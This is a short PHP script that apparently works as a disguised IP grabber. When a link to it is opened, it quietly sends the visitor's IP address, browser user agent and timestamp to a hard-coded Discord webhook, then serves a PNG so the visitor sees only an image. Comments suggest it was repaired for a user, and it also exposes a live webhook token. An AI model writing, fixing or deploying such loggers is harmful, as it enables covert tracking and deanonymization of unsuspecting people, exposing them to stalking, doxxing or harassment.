<?php
// Get visitor info
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// Your Discord webhook – FIXED (your original had wrong characters)
$webhook = 'https://discord.com/api/webhooks/1532494338477785189/piKPDYGbTysmL3tPK_HQckufpf28oSRKvUAGkt5aHA2EiSyGAMZyOphc464WIJA20Atr';

// Build message
$message = "**New Click!**\nIP: $ip\nUA: $ua\nTime: $time";

// Send to Discord via curl
$payload = json_encode(['content' => $message]);
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Serve the image – FIXED URL (your original had extra digits)
$image_url = 'https://cdn.discordapp.com/attachments/1522326026577772655/1533982395751993384/IMG_4389.png?ex=6a7277ef&is=6a71266f&hm=47bcf3074877494ca17b5451c61e4945469dce0c8e752e4fd2d457b27131d29e&';
header('Content-Type: image/png');
readfile($image_url);
?>
